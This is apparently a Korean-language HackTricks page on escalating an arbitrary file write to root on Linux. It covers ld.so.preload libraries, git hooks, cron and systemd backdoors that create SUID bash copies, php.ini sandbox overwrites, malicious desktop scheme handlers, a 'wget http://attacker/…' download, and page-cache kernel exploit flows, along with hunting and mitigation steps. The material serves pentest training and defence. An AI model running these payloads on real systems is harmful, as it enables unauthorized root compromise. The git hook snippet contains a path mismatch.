# Root에 대한 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** 환경 변수와 동일하게 동작하지만 **SUID binaries**에서도 작동합니다.\
이 파일을 생성하거나 수정할 수 있다면, 실행되는 각 binary와 함께 **로드될 library의 경로**를 추가하면 됩니다.

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 git repository에서 commit이 생성되거나 merge가 수행되는 경우와 같은 다양한 **이벤트**에 따라 **실행**되는 **스크립트**입니다. 따라서 **권한이 있는 스크립트 또는 사용자**가 이러한 작업을 자주 수행하고, **`.git` 폴더에 쓸 수 있는 경우**, 이를 **privesc**에 사용할 수 있습니다.

예를 들어, git repo의 **`.git/hooks`**에 **스크립트를 생성**하여 새 commit이 생성될 때마다 항상 실행되도록 할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron 및 시간 관련 파일

**root가 실행하는 cron 관련 파일에 쓸 수 있다면**, 일반적으로 다음 작업이 실행될 때 code execution을 얻을 수 있습니다. 흥미로운 대상은 다음과 같습니다.

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`에 있는 root 자체의 crontab
- `systemd` timers 및 해당 timer가 트리거하는 services

빠른 확인:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
일반적인 악용 경로:

- `/etc/crontab` 또는 `/etc/cron.d/`의 파일에 **새로운 root cron 작업 추가**
- `run-parts`가 이미 실행하는 **스크립트 교체**
- 실행 대상 스크립트 또는 바이너리를 수정하여 **기존 timer 대상에 백도어 삽입**

최소 cron payload 예시:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts`가 사용하는 cron 디렉터리 안에만 쓸 수 있다면, 대신 그곳에 실행 가능한 파일을 넣습니다:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
참고:

- `run-parts`는 일반적으로 점이 포함된 파일 이름을 무시하므로 `backup.sh` 대신 `backup`과 같은 이름을 사용하는 것이 좋습니다.
- 일부 distro에서는 기존 cron 대신 `anacron` 또는 `systemd` timers를 사용하지만, 악용 아이디어는 동일합니다: **root가 나중에 실행할 내용을 수정**하는 것입니다.

### Service 및 Socket 파일

**`systemd` unit 파일** 또는 해당 파일에서 참조하는 파일에 write할 수 있다면, unit을 reload하고 restart하거나 service/socket activation 경로가 trigger될 때까지 기다려 root 권한으로 code execution을 수행할 수 있습니다.

관심 있는 target은 다음과 같습니다:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf`의 Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`에서 참조하는 Service scripts/binaries
- root Service가 load하는 writable `EnvironmentFile=` paths

빠른 확인:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
일반적인 abuse 경로:

- 수정할 수 있는 root 소유 service unit의 **`ExecStart=` 덮어쓰기**
- 악성 **`ExecStart=`**가 포함된 drop-in override를 추가하고 기존 항목을 먼저 삭제
- unit에서 이미 참조하는 script/binary에 **backdoor** 삽입
- socket이 connection을 수신할 때 시작되는 해당 `.service` 파일을 수정하여 socket-activated service **Hijack**

악성 override 예시:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
일반적인 활성화 흐름:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
서비스를 직접 재시작할 수 없지만 socket-activated unit을 편집할 수 있다면, **클라이언트 연결을 기다리기만 해도** backdoored service가 root 권한으로 실행되도록 트리거할 수 있습니다.

### 권한이 높은 PHP sandbox에서 사용하는 제한적인 `php.ini` 덮어쓰기

일부 custom daemon은 **제한된 `php.ini`**(예: `disable_functions=exec,system,...`)와 함께 `php`를 실행하여 사용자가 제공한 PHP를 검증합니다. sandbox된 코드에 `file_put_contents`와 같은 **write primitive**가 하나라도 있고 daemon이 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, 해당 config를 **덮어써서** 제한을 해제한 다음 elevated privileges로 실행되는 두 번째 payload를 제출할 수 있습니다.

일반적인 흐름:

1. 첫 번째 payload가 sandbox config를 덮어씁니다.
2. 위험한 functions가 다시 활성화된 상태에서 두 번째 payload가 code를 실행합니다.

최소 예제(daemon이 사용하는 경로로 교체):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
데몬이 root로 실행되거나 root 소유 경로를 사용해 검증하는 경우, 두 번째 실행은 root 컨텍스트를 얻게 됩니다. 이는 본질적으로 sandboxed runtime이 여전히 파일을 쓸 수 있을 때 발생하는 **privilege escalation via config overwrite**입니다.

### binfmt_misc

`/proc/sys/fs/binfmt_misc`에 위치한 파일은 어떤 바이너리가 어떤 유형의 파일을 실행해야 하는지 나타냅니다. TODO: 일반적인 파일 유형이 열릴 때 이를 악용해 rev shell을 실행하려면 어떤 요구 사항이 필요한지 확인해야 합니다.

### 스키마 핸들러 덮어쓰기 (예: http: 또는 https:)

피해자의 configuration 디렉터리에 대한 쓰기 권한이 있는 attacker는 시스템 동작을 변경하는 파일을 쉽게 교체하거나 생성할 수 있으며, 그 결과 의도하지 않은 code execution이 발생합니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL 핸들러가 malicious 파일을 가리키도록 설정하면(예: `x-scheme-handler/http=evil.desktop`), attacker는 **어떤 http 또는 https 링크를 클릭하더라도 해당 `evil.desktop` 파일에 지정된 code가 실행되도록 할 수 있습니다**. 예를 들어 `$HOME/.local/share/applications`의 `evil.desktop`에 다음 malicious code를 배치하면, 외부 URL을 클릭할 때마다 내장된 command가 실행됩니다:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
자세한 내용은 실제 vulnerability를 exploit하는 데 사용된 [**이 게시물**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)을 확인하세요.

### root가 실행하는 사용자 쓰기 가능 scripts/binaries

권한이 있는 workflow가 `/bin/sh /home/username/.../script`와 같은 항목(또는 권한이 없는 사용자가 소유한 directory 내부의 binary)을 실행한다면 이를 hijack할 수 있습니다.

- **실행 감지:** [pspy](https://github.com/DominicBreuker/pspy)로 processes를 monitor하여 root가 user-controlled paths를 invoke하는지 확인합니다:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** target file과 해당 디렉터리가 모두 사용자의 소유이며 쓰기 가능한지 확인합니다.
- **Hijack the target:** 원본 binary/script를 backup하고, SUID shell을 생성하는 payload(또는 다른 root action)를 배치한 다음 권한을 복원합니다:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (예: helper를 생성하는 UI 버튼 누르기). root가 hijacked path를 다시 실행하면 `./rootshell -p`로 escalated shell을 획득합니다.

### Privileged binary의 page-cache-only file modification

일부 kernel bug는 파일을 **on disk**에서 수정하지 않습니다. 대신 읽을 수 있는 파일의 **page cache copy**만 수정할 수 있게 합니다. **setuid** 또는 그 외에 **root-executed** binary를 대상으로 지정할 수 있다면, 다음 실행 시 메모리의 attacker-controlled bytes가 실행되어 파일의 on-disk hash가 변경되지 않은 상태에서도 privileges를 escalate할 수 있습니다.

이는 **runtime-only file write primitive**로 생각하면 유용합니다:

- **Disk stays clean**: inode와 on-disk bytes는 변경되지 않음
- **Memory is dirty**: cached page를 읽거나 실행하는 process는 attacker-modified content를 가져감
- **Effect is temporary**: reboot 또는 cache eviction 후 변경 사항이 사라짐

이 primitive는 일반적인 **arbitrary file write**와 Dirty COW / Dirty Pipe 같은 기존 **page-cache abuse** bug 사이에 있습니다:

- Dirty COW는 race에 의존
- Dirty Pipe에는 write-position 제약이 있었음
- vulnerable path가 cached file-backed pages에 직접 write를 제공한다면, page-cache-only primitive가 더 reliable할 수 있음

#### Generic privesc flow

1. **file-backed page cache pages**에 write할 수 있는 kernel primitive 확보
2. 이를 **readable privileged binary** 또는 그 밖의 root-executed file에 사용
3. page가 cache에서 evicted되기 **전에** execution trigger
4. on-disk file이 여전히 수정되지 않은 것처럼 보이는 상태에서 root로 code execution 획득

일반적인 high-value target:

- **setuid-root** binaries
- **root services**가 실행하는 helpers
- **host kernel/page cache를 공유하는 containers**에서 일반적으로 실행되는 binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)은 이 class의 좋은 example입니다. vulnerable path는 Linux crypto userspace API (`AF_ALG` / `algif_aead`)에 있었습니다:

- `splice()`는 readable file의 page-cache pages에 대한 references를 crypto TX scatterlist로 이동할 수 있음
- in-place `algif_aead` decrypt path는 source와 destination buffers를 재사용함
- `authencesn`은 이후 destination tag region에 write함
- 해당 region이 여전히 spliced file-backed pages를 참조하고 있으면, write가 **target file의 page cache**에 적용됨

따라서 중요한 technique은 CVE 자체가 아니라 다음 pattern입니다:

- **file-backed cache pages를 kernel subsystem에 전달**
- subsystem이 이를 **writable output으로 취급**하게 함
- memory에서 작고 controlled한 overwrite를 trigger

공개 PoC는 반복적인 **4-byte writes**를 사용해 `/usr/bin/su`를 memory에서 patch한 다음 이를 실행했습니다.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503)은 동일한 **page-cache-only write-to-root** pattern의 또 다른 variant를 보여주지만, 이번에는 sink가 `AF_ALG`가 아니라 **IPsec ESP decrypt**입니다.

중요한 technique은 **metadata-laundering step**입니다:

- `splice()`는 **read-only file-backed page-cache page**를 ESP-in-UDP packet에 배치함
- 기존 DirtyFrag mitigation은 해당 skb에 `SKBFL_SHARED_FRAG`를 tag하여 `esp_input()`이 **decrypt 전에 copy**하도록 함
- netfilter `TEE`는 `nf_dup_ipv4()` -> `__pskb_copy_fclone()`을 통해 packet을 duplicate함
- clone은 동일한 **physical page-cache reference**를 유지하지만 `SKBFL_SHARED_FRAG`를 잃음
- 이후 `esp_input()`은 clone을 safe한 것으로 간주하고 file-backed page에 대해 **in-place `cbc(aes)` decrypt**를 실행함

따라서 reviewer lesson은 CVE보다 더 광범위합니다. operation 전에 반드시 copy해야 하는지를 판단하기 위해 **skb/page metadata**에 의존하는 mitigation이라면, backing page는 유지하면서 metadata를 제거하는 모든 **clone/copy path**가 write primitive를 조용히 다시 열 수 있습니다.

일반적인 exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`를 사용해 **private network namespace 내부에서 `CAP_NET_ADMIN`** 획득
2. loopback을 올리고 `mangle/OUTPUT`에 **netfilter `TEE` rule** 설치
3. `NETLINK_XFRM`을 통해 **XFRM ESP transport SAs** 설치
4. 각 target 4-byte word를 SA `seq_hi` field에 encode (DirtyFrag의 word-selection trick)
5. spliced ESP-in-UDP packet을 전송하여 **TEE clone**이 `esp_input()`에 도달하고 **in place**로 decrypt하도록 함
6. `/usr/bin/su` 또는 다른 privileged executable의 page-cache copy가 attacker-controlled code를 포함할 때까지 반복

Operationally, impact는 `AF_ALG` example과 동일합니다. disk의 file은 clean 상태로 유지되지만 `execve()`는 **mutated page-cache bytes**를 사용하여 root를 제공합니다.

이 variant에서 유용한 exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
단기적인 attack surface 축소도 여기서는 경로별로 적용됩니다. `48f6a5356a33`을 포함하는 kernel로 업그레이드하면 clone 경로가 수정되고, `xt_TEE` autoload를 차단하면 **flag-laundering step**이 제거되며, `esp4` / `esp6`를 차단하면 **decrypt sink**가 제거됩니다.

#### 노출 및 hunting

이 버그 유형이 의심된다면 disk integrity checks에만 의존하지 마세요. 다음 항목도 확인해야 합니다:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`를 module로 load/unload할 수 있음
- `CONFIG_CRYPTO_USER_API_AEAD=y`: 해당 interface가 kernel에 내장됨
- setuid binaries는 좋은 target임. page-cache-only patch만으로도 local foothold를 root로 전환하기에 충분할 수 있기 때문임

#### `algif_aead` 경로의 attack-surface reduction

vulnerable interface가 loadable module로 제공되는 경우:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
커널에 컴파일되어 있는 경우, 일부 공개 사례에서는 다음과 같이 init 경로를 차단한다고 보고했습니다:
```bash
initcall_blacklist=algif_aead_init
```
이러한 종류의 완화 조치는 다른 kernel LPE에도 기억해 둘 가치가 있습니다. exploitation이 특정 optional interface에 의존하는 경우, 전체 kernel upgrade를 적용할 수 있기 전이라도 해당 interface를 비활성화하거나 blacklist에 추가하면 exploit 경로를 차단할 수 있습니다.

## References

- [HTB Bamboo – user-writable PaperCut directory에서 root-executed script hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [CVE-2026-31431에 대한 Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - out-of-place 방식으로 되돌리기](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) 분석 및 exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: `__pskb_copy_fclone()`에서 `SKBFL_SHARED_FRAG` 보존 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux earlier mitigation: spliced UDP packets에 `SKBFL_SHARED_FRAG` 설정 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
